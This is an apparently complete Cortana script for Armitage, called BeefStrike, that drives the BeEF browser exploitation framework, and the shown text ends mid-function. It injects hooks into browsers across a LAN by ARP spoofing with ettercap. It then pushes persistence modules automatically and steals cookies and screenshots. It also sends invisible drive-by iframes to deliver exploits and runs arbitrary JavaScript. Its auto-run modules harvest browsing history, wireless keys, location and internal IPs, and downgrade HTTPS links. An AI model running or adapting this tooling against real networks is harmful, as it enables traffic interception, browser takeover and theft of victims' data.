############################ WARNING !!!##################################################
##																 				        ##
##		Before beginning to use this script, change all the 					        ##									 															  
##	"import" lines ... Obviously you must put the right path for each Library. 			##
##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"		##$*
##																						##
##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
##		README file and watch Youtube video demo before use it  						##
##															 						    ##	
##																						##	
##                  >   by Beny Green    <												##
##			       [  aka @TheBenyGreen	  ]												##												 						    ##				 				
##	 			 																		##													 																  
##########################################################################################
import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-logging-1.1.3.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-beanutils-1.8.3.jar;
import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-collections-3.2.1.jar;
import net.sf.json.* from:  C:\BeefLib\dist\lib\json-lib.jar;
import net.sf.ezmorph.* from:  C:\BeefLib\dist\lib\ezmorph-1.0.6.jar;

################### CORE variables ###############################################

#global('@beef_hosts @beef_hostsoff @beef_cmde @beef_result $key $beefUrl $user $pass');
@beef_hosts = @(%());  # array of beef online zombies
@beef_hostsoff = @(%());  # array of beef offline zombies
@beef_cmde = @(%());  # array of beef commandes - list
@beef_result = @(%());  # array of beef command result - list [NOT USE YET]
$key = "00000000000000000000000" ; # the MUCH important RESTful API key
$recon = 0; # Auto recon status
$zombieNumMonitor = 0 ; # monitor the variation of the zombies number
$size_on = 0; $size_off = 0;
# SNIPER variables
#@analyze = @(%());									  
@browser_profile_list = @(%());
#@targets = @(%());
#@beef_autorun = @(%());
$assault_mode = 0;
$targets_id = 0 ;
$id_analyz = 0;
$id_beef_autorun = 0 ;
######################## Introduction ###########################################
on ready {
	$console = console();
	$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
	cmd($console , " \c8 Using beefmetasploitplugin is no longer a need for BeefStrike. But we always take care for some users accomodance.");
	cmd($console , "load beef");
	say("Beef_Strike is running");
	}

on console_beef_connect {
	}

#########################  BeEF  MENU BAR    ##############################
popup attacks {
	menu "BeEF Strike"{
		menu "Start" {
			item "Connect" {
		# Default value of Auto-import & Client-side auto-recon.
			#$import = 0;
			#$recon = 1;
			cmd($console , "beef_disconnect");
			$beefUrl = prompt_text("BeEF Server (with http://). Don't use loopback","http://192.168.1.22:4000");
			$user = prompt_text("User","beef");
			$pass = prompt_text("Password","beef");
			$connect = "curl -H \"Content-Type: application/json; charset=UTF-8\"  -X POST -d '{\"username\":\"$user\", \"password\":\"$pass\"}' " . $beefUrl . "/api/admin/login";
			cmd($console , "$connect");
			cmd($console , "beef_connect $beefUrl $user $pass");sleep(30);
			show_message(" [+] Copy and add your RESTful_API_Key (Token)"); 
			}
			item " Key" {
				$key = prompt_text("Copy and Paste RESTful_API_Key here","$key");
					if ($key ne "00000000000000000000000" ){ 
					show_message("Well done, now wait for new zombie.");
					}else{show_message("Your key cannot be the default 0000000000000000 ");}
				println("Here is the REST_ful API Key: $key ");
			}
		}
		menu "Recruitment" {
#use ettercap filter for html injection - low injection success rate.
			item "ettercap method" {
					$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
					$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
					cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
					cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
					cmd($console , "\c9[+] ettercap filter > Contamination beging ...");
					show_message("ettercap filter > Contamination beging ...");
			}
			item "Other method"{
	# this feature will use iframe_injector script from mitmproxy to increase injection success rate over a LAN.
				show_message("[Recruitment method idea] \n XSS scanning : find permanent xss vulns and inject beef hooks.\n Spear phishing campaign: send email with a link to your BeEF's hook\n Watering Hole and cloned web-site with your beef hook embeded.\n Demos: youtube.com/thebenygreen");				}
			}
		item "Horde of zombies" {
			local('$zombitableoff');
			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
			refresh_hostsoff($zombitableoff);
			# two tab is open for Online and offline zombies.
			local('$zombitable');
			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh", "More details"), "zmb_hook", 1);
			refresh_hosts($zombitable);
			}
		item "Results table" {
			local('$resultable');
			$resultable = open_table_tab("Results", "", @("command_ID", "sessionID","result"), @(), @("Refresh results"), "result_hook", 1);
			refresh_result($resultable);
		}
		item "BeEF-Console" {
				$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
				cmd($console , "load beef");
				cmd($console , "beef_connect $beefUrl $user $pass");
				}
		item "Web UI panel" {
				$beefUrlpanel = "/ui/panel";
				url_open("$beefUrl $+ $beefUrlpanel");
				}
		item "Disconnect" {
				cmd($console , "beef_disconnect");
				cmd($console , "load beef");
			 }
	}
}

on host_add {cmd($console , "\n \c9 [+] New zombie with IP: $1");}

# The heart beat of BeefStrike, specify the frequency of each update : zombie online and offline list, zombie importation
on heartbeat_10s {
	zombiupdate();
	}

################### Menu of action to interact with each zombie #################
popup zmb_hook {
			@idr = flatten(table_selected($1, "id"));
			@adr = flatten(table_selected($1, "address"));
			@sessidr = flatten(table_selected($1, "sessionID"));
			$idr = @idr[0]; 
			$adr = @adr[0];
			$sessidr = @sessidr[0];
		item "Informations" { 
			zombi_info($idr);
			}
		menu "Recon." {
			item "Port scan" { #4
				$cmde_param = prompt_text("Ports to scan (exemple:)","\"ipHost\":\"$adr\",\"ports\"=\"80,445,22,21\"");
				send_beefcmd_with_param($sessidr, 4, $cmde_param, 0);
			}
			item "Check cmd result" {
			#check_beef_cmd_result($sessidr, $idcmde);
			#recon_result($idr);
			}
			}
		menu "Attack" {
			item "Drive-by" { 
				local ('$inviframe');
				$inviframe = prompt_text("URL (with http://)","http://");
				append($console, "\c4[*] Come here baby !");
				append($console , "Send invisible iframe : " . $inviframe . " --> " . $sessidr . "" );
				run_driveby($beefUrl, $sessidr, $key, $inviframe);
				}
			item "Raw JS" {#23
				$cmde_param = prompt_text("JS code (here is the exemple to follow)","\"cmd\":\"alert('WTF');\"");
				send_beefcmd_with_param($sessidr, 23, $cmde_param, 0);
				} 		
	 		}
		menu "Special" {
			item "Get_cookie" {	#17
				append($console , "Get all cookies of > " . $adr . "" );
				send_beef_cmd_without_param($sessidr, 17);
				#check_beef_cmd_result($sessidr, 17);
				}
			item "Screenshot" {#103
				append($console , "Screenshot of > " . $adr . "" );
				send_beefcmd_with_param($sessidr, 103,"", 0);
				#check_beef_cmd_result($sessidr, 103);
				}
			#menu "Geolocation" { #110
			#		local ('$maptype $json_freegeoip');
			#		item "Satellite type" {
			#		append($console , "Geolocate > " . $adr . "" );
			#		send_beef_cmd_without_param($sessidr, 110);
					#check_beef_cmd_result($sessidr, 110);
			#		$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
			#		$maptype = "satellite";
			#		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
			#		geomap($json_freegeoip, $maptype);
			#		}
			#		item "Roadmap type" {
			#		append($console , "Geolocate > " . $adr . "" );
			#		send_beef_cmd_without_param($sessidr, 110);
			#		#check_beef_cmd_result($sessidr, 110);
			#		$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
			#		$maptype = "roadmap";
			#		$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
			#		geomap($json_freegeoip, $maptype);
			#		}		
			#	}
			item "Send command " { 
				local ('$idcmde');
				append($console , "Send Command ID to >>>" . $adr . "" );
				$idcmde = prompt_text("Command ID","27");
				send_beefcmd_with_param($sessidr, $idcmde, "", 1);
				
				#$capt = check_beef_cmd_result($sessidr, $idcmde);
				#%result = %(command_ID => $idcmde, sessionID => "$session", result => "$capt");
				#@beef_result[$idcmde] = %result;
				}
			}
		item "Unhook" {
				append($console , "Unhook : " . $idr . " -> pushed out off the horde" );
				send_beef_cmd_without_param($sessidr, 105);
		}
	}	
# This function send beEF command without param !
sub send_beef_cmd_without_param {
			$link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key";
			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{}' -X POST " . $link . "";
			cmd($console , "$send_url");sleep(20);
			}

sub check_beef_cmd_result {
# Only the first command ID for the moment
			local('$resultable');
			$resultable = open_table_tab("Results", "", @("command_ID", "sessionID","result"), @(), @("Refresh results"), "result_hook", 1);
			refresh_result($resultable);
			#$rslt_link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "/1?token=$key";
			#append($console, "\c9 [*] Result of module ID $2 ");
			#cmd($console , "$send_url");
			#$cmderslt = [BeefRequester BeefGetRequest: "$rslt_link"];
			#sleep(20);
			#show_message("RESULT FOR $2 \n $cmderslt");
			#return $cmderslt ;
			#%result = %(command_ID => $idcmde, sessionID => "$session", result => "$capt");
			#@beef_result[$idcmde] = %result;
			#@beef_result[] = @(%());$cmderslt
			#$jsoncmderesult = [new JSONObject];
			#$jsoncmderesult= [JSONSerializer toJSON: "$cmderslt"];
			#$name = [[$jsoncmdeinfo get: "name"] toString];
			}			

# Send beef command with params using sesion ID and RESTfull_API key 	
sub send_beefcmd_with_param {
	if ($4 == 1) { $cmde_param = prompt_text("Configure option(s) or leave empty for default values.","\"param1\":\"value1\",\"param2\"=\"value2\""); }
	else { $cmde_param = $3; }
	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key"; # $4 is the param
	$attak2 = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{" . $cmde_param . "}' -X POST " . $link2 . "";
	cmd($console , "$attak2");sleep(20);
	}			
sub refresh_hosts {
	table_set($1, @beef_hosts);
	}
	
sub refresh_hostsoff {
	table_set($1, @beef_hostsoff);
}

sub refresh_result {
	table_set($1, @beef_result);
}

on tab_table_click {
	if ($3 eq "Refresh") {
		refresh_hosts($1);
	}
	if ($3 eq "RefreshOFF") {
		refresh_hostsoff($1);
	}
	if ($3 eq "Fill it") {
		fill_cmde_tab($1);
	}
	if ($3 eq "Refresh results") {
		refresh_result($1);
	}
	if ($3 eq "See autorun list") {
		local('$beef_autorun');
		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds"), "sniper_hook", 1);
		refresh_list($beef_autorun);
		}
	if ($3 eq "More details") {
		local('$beef_details');
		$beef_details = open_table_tab("Zombies details", "", @("id", "sessionID", "Browser", "ReportedName", "Type","Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "GoogleGears", "WebSocket", "HostName"), @(), @("Refresh details"), "", 1);
		refresh_details($beef_details);
		}
	if ($3 eq "Edit Param") {
		editparam($1);
		}
	if ($3 eq "Refresh profiles") {
		refresh_profiles($1);
	}
	if ($3 eq "Edit") {
		edit_profiles($1);
	}
	if ($3 eq "Add") {
		add_profiles($1);
	}
	if ($3 eq "Delete") {
		delete_profiles($1);
	}
	if ($3 eq "Refresh match") {
		refresh_analyze($1);
	}
	if ($3 eq "Change URL") {
		changeurl($1);
	}
	if ($3 eq "Sniper shot") {
		shot($1);
	}
	if ($3 eq "Refresh list") {
		refresh_list($1);
	}
	if ($3 eq "Delete entry") {
		delete_entry($1);
	}
	if ($3 eq "Load Clent-side Recon cmds") {
		load_clientside_recon_mod();
		refresh_list($1);
	}
	if ($3 eq "Refresh details") {
		refresh_details($1);
	}
}

# So what append when we have a new zombie ?
on zombies_news { println("who is here"); println($1); 
	if ( $1 = 0){$b = $1; } else { $b = $1 - 1 ;} println("who is After ops"); println($1);
	#$b = $1 - 1 ; # magic ops to retrieve good Id ... :-)
	host_add(@beef_hosts[$b]["ip"]); 
	# Build and store browser's profile of the new zombie
	$sid = @beef_hosts[$b]["sessionID"];
	append($console, "\c9 [+] Send MiTB module for Persistence.");	
	send_beefcmd_with_param($sid, 32, "", 0); # MITB Persistence
	host_os(@beef_hosts[$b]["ip"],@beef_hosts[$b]["OS"]);
	$link = "" . $beefUrl . "/api/hooks/" . $sid . "?token=" . $key . "";
		$details = [BeefRequester BeefGetRequest: "$link"];#sleep(100);
		$js = [new JSONObject];
		$js = [JSONSerializer toJSON: "$details"];
		$BrowserName = [[$js get: "BrowserName"] toString];#used by sniper
		$BrowserPlugins = [[$js get: "BrowserPlugins"] toString];#used by sniper
		$BrowserReportedName = [[$js get: "BrowserReportedName"] toString]; println($BrowserReportedName);
		$BrowserType = [[$js get: "BrowserType"] toString];
		$BrowserVersion = [[$js get: "BrowserVersion"] toString];#used by sniper
		$HasActiveX = [[$js get: "HasActiveX"] toString];#used by sniper
		$HasFlash = [[$js get: "HasFlash"] toString];#used by sniper
		$HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
		$HasWebSocket = [[$js get: "HasWebSocket"] toString];
		$HostName = [[$js get: "HostName"] toString];
		$JavaEnabled = [[$js get: "JavaEnabled"] toString];#used by sniper
		$OsName = [[$js get: "OsName"] toString];#used by sniper
		$SystemPlatform = [[$js get: "SystemPlatform"] toString];#used by sniper
		$VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];#used by sniper
		%browser_profile = %(id => "$b", sessionID => "$sid", Browser => "$BrowserName", ReportedName => "$BrowserReportedName", Type => "$BrowserType", Version => "$BrowserVersion", OS => "$OsName", Platform => "$SystemPlatform", ActiveX => "$HasActiveX", Flash => "$HasFlash", Java => "$JavaEnabled", VBScript => "$VBScriptEnabled", Plugins => "$BrowserPlugins", GoogleGears => "$HasGoogleGears", WebSocket => "$HasWebSocket", HostName => "$HostName" );
	@browser_profile_list[$b] = %browser_profile;
	#fire_event("analyze_target", $b);
	fire_event("play_autorun_cmd", $b);

	}

on analyze_target {
	match_it($1);}
on play_autorun_cmd {
	append($console, "\c8 [*] Check and execute Autorun commands --->");	
	beef_autorun($1);}

# This action try to keep your zombie list up to date inside Armitage
sub zombiupdate {
  $hooks_list_link = "" . $beefUrl . "/api/hooks?token=" . $key . "";
  $jsonTxt = [BeefRequester BeefGetRequest: "$hooks_list_link"];sleep(100);
#JSON Processing ---- ONLINE ZOMBIES -----* * *------------------	
  clear(@beef_hosts);
  $on = [OnlineClass extractOnline: $jsonTxt ];
	
  for ($i = 0; $i < [$on size]; $i++)   {
		$id = $i ;
		$ip = [OnlineClass extractZombieData: $jsonTxt, $i, "ip"]; 
		$name = [OnlineClass extractZombieData: $jsonTxt, $i, "name"];  
		$version = [OnlineClass extractZombieData: $jsonTxt, $i, "version"]; 
		$os = [OnlineClass extractZombieData: $jsonTxt, $i, "os"];  
		$platform = [OnlineClass extractZombieData: $jsonTxt, $i, "platform"]; 
		$domain = [OnlineClass extractZombieData: $jsonTxt, $i, "domain"]; 
		$port = [OnlineClass extractZombieData: $jsonTxt, $i, "port"]; 
		$page_uri = [OnlineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
		$session = [OnlineClass extractZombieData: $jsonTxt, $i, "session"];
		%hoston = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
		@beef_hosts[$i] = %hoston;	
		}
#JSON Processing ---- OFFLINE ZOMBIES -----* * *------------------
  clear(@beef_hostsoff);
  $off = [OfflineClass extractOffline: $jsonTxt ];
	
  for ($i = 0; $i < [$off size]; $i++)   {
		$id = $i ;
		$ip = [OfflineClass extractZombieData: $jsonTxt, $i, "ip"]; 
		$name = [OfflineClass extractZombieData: $jsonTxt, $i, "name"];  
		$version = [OfflineClass extractZombieData: $jsonTxt, $i, "version"]; 
		$os = [OfflineClass extractZombieData: $jsonTxt, $i, "os"];  
		$platform = [OfflineClass extractZombieData: $jsonTxt, $i, "platform"]; 
		$domain = [OfflineClass extractZombieData: $jsonTxt, $i, "domain"]; 
		$port = [OfflineClass extractZombieData: $jsonTxt, $i, "port"]; 
		$page_uri = [OfflineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
		$session = [OfflineClass extractZombieData: $jsonTxt, $i, "session"];
		%hostoff = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
		@beef_hostsoff[$i] = %hostoff;	
		}
		$size_on = size(@beef_hosts);  $size_off = size(@beef_hostsoff);
# Fire event when there is a positive variation of zombies's number.	
  if ($zombieNumMonitor < $size_on){
		
		append($console, "\c9 [+] New zombie(s) join the horde");
		println("\c9 [+] New zombie(s) join the horde");
		say("New zombie(s) join the horde");
		$prevnum = $zombieNumMonitor ;
		$zombieNumMonitor = $size_on ;
		$newnum = $zombieNumMonitor ; 
		#$i = $prevnum;
		#while ( $i < $newnum)   
		for ($i = $prevnum; $i < $newnum; $i++) {
			println("--i---");println($i);
			fire_event("zombies_news", $i);
			#$i++
			#sleep(100);
			}
		} 
	if ($zombieNumMonitor > $size_on){
		append($console, "\c4 [-] Some zombies have leave the horde");
		println("\c4 [-] Some zombies have leave the horde");
		say("Some zombies have leave the horde");
		$zombieNumMonitor = $size_on ;
		} 
}

#################################### GIVE ME MY SHELL ! ###########################
# I love this action, it send invisible iframe to your target so easily that you can play with client-side exploit like you do with remote exploit. :-D awesome !
sub run_driveby {
	$link = "" . $1 . "/api/modules/" . $2 . "/27?token=$3";
	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"" . $4 . "\"}' -X POST " . $link . "";
	cmd($console , "$attak");
	say("Send invisible iFrame: " . $4 . " via Beef_Strike ");
	}
# this action show an info box with details about a particular zombie
sub zombi_info {
   $BrowserName = @browser_profile_list[$1]["Browser"] ;
   $BrowserPlugins = @browser_profile_list[$1]["Plugins"] ;
   $BrowserReportedName = @browser_profile_list[$1]["ReportedName"] ;
   $BrowserType = @browser_profile_list[$1]["Type"] ;
   $BrowserVersion = @browser_profile_list[$1]["Version"] ;
   $HasActiveX = @browser_profile_list[$1]["ActiveX"] ;
   $HasFlash = @browser_profile_list[$1]["Flash"] ;
   $HasGoogleGears = @browser_profile_list[$1]["GoogleGears"] ;
   $HasWebSocket = @browser_profile_list[$1]["WebSocket"] ;
   $HostName = @browser_profile_list[$1]["HostName"] ;
   $JavaEnabled = @browser_profile_list[$1]["Java"] ;
   $OsName = @browser_profile_list[$1]["OS"] ;
   $SystemPlatform = @browser_profile_list[$1]["Platform"] ;
   $VBScriptEnabled = @browser_profile_list[$1]["VBScript"];
   show_message( "BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
}

###################   JSON Processing ---- BEEF COMMANDS ---- #####################
sub fill_cmde_tab {
	fill();
	sleep(50);
	table_set($1, @beef_cmde);
	}

sub cmde_info {
	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "?token=" . $key . "";
	$cmdeid = [BeefRequester BeefGetRequest: "$link2"];sleep(1000);
	$jsoncmdeinfo = [new JSONObject];
	$jsoncmdeinfo = [JSONSerializer toJSON: "$cmdeid"];
   $name = [[$jsoncmdeinfo get: "name"] toString];
   $description = [[$jsoncmdeinfo get: "description"] toString];
   $options = [[$jsoncmdeinfo get: "options"] toString];
   	show_message( "Name: " . $name . "\n +---------------------------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-------------------------------------------+");
	}

sub fill {
	$cmd_list_link = "" . $beefUrl . "/api/modules?token=" . $key . "";
	$jsonTxt_cmde = [BeefRequester BeefGetRequest: "$cmd_list_link"];
   $c = [CommandList extractCommands: $jsonTxt_cmde] ;
	for ($i = 0; $i < [$c size]; $i++)   {
		$id = [CommandList extractcmdData: $jsonTxt_cmde, $i, "id"]; 
		$name = [CommandList extractcmdData: $jsonTxt_cmde, $i, "name"];  
		$category = [CommandList extractcmdData: $jsonTxt_cmde, $i, "category"]; 
		%cmde = %(id => "$id", name => "$name", category => "$category");
		@beef_cmde[$i] = %cmde;	
	}
}
popup sniper_hook {
			@ccr = flatten(table_selected($1, "id"));
			$ccr = @ccr[0];
			item "Informations" { 
				cmde_info($ccr);
				}
			}
popup cmde_hook {
			@idr = flatten(table_selected($1, "id"));
			@namedr = flatten(table_selected($1, "name"));
			@catdr = flatten(table_selected($1, "category"));
			$idr = @idr[0];
			$namedr = @namedr[0];
			$catdr = @catdr[0];
			item "Informations" { 
				cmde_info($idr);
				}
			menu "Add to autorun list" {
					item "For All" {%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "All", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;			}
					item "IExplorer (IE)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "IE", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Firefox (FF)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "FF", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Chrome (C)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "C", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Opera (O)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "O", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
					item "Safary (S)"{%cmde = %(cc => "$id_beef_autorun", id => "$idr", name => "$namedr", category => "$catdr", browser => "S", Param => "");
						@beef_autorun[$id_beef_autorun] = %cmde;
						$id_beef_autorun = $id_beef_autorun + 1 ;	}
			}
}

###########################  HOST Sub-Menu ###########################
popup host_bottom {
	item "BeEF" {local('$zombitableoff');
			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
			refresh_hostsoff($zombitableoff);
			# two tab is open for Online and offline zombies.
			local('$zombitable');
			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh","More details"), "zmb_hook", 1);
			refresh_hosts($zombitable);
			}
}
######################## HOST ICON ###################################
# when zombie is offline icon will turn red. This filter show you the browser hooked icon
filter host_image {
	local('$ip $ipoff $name $nameoff');
	$address = $2['address'];
# Blue beef ICON for online zombie
	
	for ($i = 0; $i < size(@beef_hostsoff); $i++ ) {
		%hostoff = @beef_hostsoff[$i];
		$ipoff = %hostoff['ip'];
		$nameoff = %hostoff['name'];
		if ($ipoff eq $address ){
				push($1, script_resource("zombieoff.png"));
				break;
			}
	}
	for ($i = 0; $i < size(@beef_hosts); $i++ ) {
		%host = @beef_hosts[$i];
		$ip = %host['ip'];
		$name = %host['name'];
		if ($ip eq $address ){
				push($1, script_resource("zombie.png"));
				if ($name eq "IE"){
				push($1, script_resource("iexplorer_hk.png"));
				} 
				if ($name eq "FF"){
				push($1, script_resource("firefox_hk.png"));
				}
				if ($name eq "C"){
				push($1, script_resource("chrome_hk.png"));
				}
				if ($name eq "O"){
				push($1, script_resource("opera_hk.png"));
				}
				if ($name eq "S"){
				push($1, script_resource("safari_hk.png"));
				}
				if ($name eq "UN"){
				push($1, script_resource("unknow_hk.png"));
				}
			}
		}
		# ICON appearance for sniper .
		for ($i = 0; $i < size(@analyze); $i++ ) {
		%target_dr = @analyze[$i];
		$iptarget = %target_dr['ip'];
		if ($iptarget eq $address ){
			push($1, script_resource("sniper.png"));
			}
		}
	return @_;
}

######################## GEOLOCATE  ZOMBIE ON A MAP ##################
# 	Use freegeoip.net web services 	  						  		 #
sub geomap {
	$js = [new JSONObject];
	$js = [JSONSerializer toJSON: "$1"];
   $ip = [[$js get: "ip"] toString];
   $country = [[$js get: "country_name"] toString];
   $city = [[$js get: "city"] toString];
   $lat = [[$js get: "latitude"] toString];
   $lon = [[$js get: "longitude"] toString];
   $map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&center=" . $lat . "," . $lon . "&maptype=" . $2 . "&zoom=13&sensor=false";
   #url_open("$map_url"); # IN USE BEFORE FINISH THE IMAGE TAB
   $map_tab = open_image_tab("Map", @(), @("Satellite", "Roadmap"));
 #  $map_tab = open_image_tab("Map", $arg, @("Satellite", "Roadmap"));
   set_image($map_tab, "$map_url");
}
on tab_image_click {
	# NOT IMPLEMENTED YET      
	}                       
								
#                               ____________
#                              | Ooh Yeah ! |
#                              |____________|
# ______________________________||________||___
#[_______________________,----------._ [====]o'""-,__....----=====
#                  [____(oooooooooooo)___________/__________     |
#        Browser Sniper  //""""""""""  |====| [_)           \    |
#                       // \\          |====| 	             \   |
#                      //   \\         |====|                 """"
#                     (_)   (_)        `----'
 
popup attacks {
	menu "Browser Sniper"{
		#append($console , "\cB[*] Browser Sniper is an Open Web Drive-by Center" );
	item "Commands" {
			local('$commandtab');
			$commandtab = open_table_tab("Commands", "", @("id","name","category"), @(), @("Fill it", "See autorun list"), "cmde_hook", 1);
			fill_cmde_tab($commandtab);
			}
	
	item "Autorun list" {
		local('$beef_autorun');
		$beef_autorun = open_table_tab("BeEF autorun", "", @("cc", "id", "name", "category", "browser", "Param"), @(), @("Refresh list","Delete entry","Edit Param", "Load Clent-side Recon cmds"), "sniper_hook", 1);
		refresh_list($beef_autorun);
		}
		
	# item "Web Drive-by Config" {
	#	local('$sniper');
	#	$sniper = open_table_tab("Web Drive-by", "", @("id", "Browser", "Version", "OS", "Platform", "ActiveX", "Flash", "Java", "VBScript", "Plugins", "Attack_URL"), @(), @("Edit", "Refresh profiles","Add", "Delete"), "sniper_hook", 1);
	#	refresh_profiles($sniper);
	#	}
	#item "Line of Sight(+) " {
	#		local('$attackMap');
	#		$attackMap = open_table_tab("Line of Sight", "", @("id", "ip", "sessionID", "Attack_URL"), @(), @("Refresh match", "Change URL", "Sniper shot"), "analyze_hook", 1);
	#		refresh_analyze($attackMap);
	#	}
	#menu "Assault mode" {
	#	item "Active" {   
	#			append($console, "\cC [*] Sniper is in assault mode");
	#			show_message(" [Browser Sniper ===--|_|-\_;=)  ] -  \n Intelligent URL Distribution is ACTIVE (Web drive-by) \n -------------------------- \n This functionnality improve the way pentesters work with Client-side exploits when they choose Armitage or Cobalt Strike.\n"); 
	#			$assault = 1 ;
	#			}
	#	item "Stand-by" {  
	#			append($console, "\c4 [-]  Sniper is in stand-by. \n this mode is usefull only if you want to send attack_URL manualy so that you control each attempt");
	#			$assault = 0 ;
	#	        }
	#	item "Shot all" {  
	#			append($console, "\cC [*] Send All the attack_URL \n Normaly you don't need to do this action if your sniper is already in active mode");
	#			snipershot_all();
	#	        }
	#	}
	}
 }
popup analyze_hook {
		item "Sniper shot" {shot();}	
	} 

sub refresh_analyze {
	table_set($1, @analyze);
	}
	
sub refresh_list {
	table_set($1, @beef_autorun);
	}
	
sub refresh_details {
	table_set($1, @browser_profile_list);
	}
sub load_clientside_recon_mod {
			show_message("\c9 [+] Client-side Recon. modules loaded");
			if ( $recon == 0 ) { 
			%cmd0 = %(cc => "$id_beef_autorun", id => "102", name => "fingerprint browser", category => "client-side Recon", browser => "All", Param => "All");
			%cmd1 = %(cc => "$id_beef_autorun", id => "95", name => "replace https hrefs by http", category => "client-side Recon", browser => "All", Param => "");
			%cmd2 = %(cc => "$id_beef_autorun", id => "79", name => "get visited domains", category => "client-side Recon", browser => "All", Param => "");
			%cmd3 = %(cc => "$id_beef_autorun", id => "80", name => "get visited URLs", category => "client-side Recon", browser => "All", Param => "");
			%cmd4 = %(cc => "$id_beef_autorun", id => "107", name => "get Wireless keys", category => "client-side Recon", browser => "All", Param => "");
			%cmd5 = %(cc => "$id_beef_autorun", id => "110", name => "get location using location API", category => "client-side Recon", browser => "All", Param => "");
			%cmd6 = %(cc => "$id_beef_autorun", id => "117", name => "get internal IP (behind NAT)", category => "client-side Recon", browser => "All", Param => "");
			%cmd7 = %(cc => "$id_beef_autorun", id => "112", name => "get system information", category => "client-side Recon", browser => "All", Param => "");
			%cmd8 = %(cc => "$id_beef_autorun", id => "115", name => "detect installed software (IE only)", category => "client-side Recon", browser => "IE", Param => "");
			@beef_autorun[$id_beef_autorun] = %cmd0; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd1; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd2; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd3; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd4; $id_beef_autorun = $id_beef_autorun + 1 ;
			@beef_autorun[$id_beef_autorun] = %cmd5; $id_beef_autorun = $id_beef_autorun + 1 ;
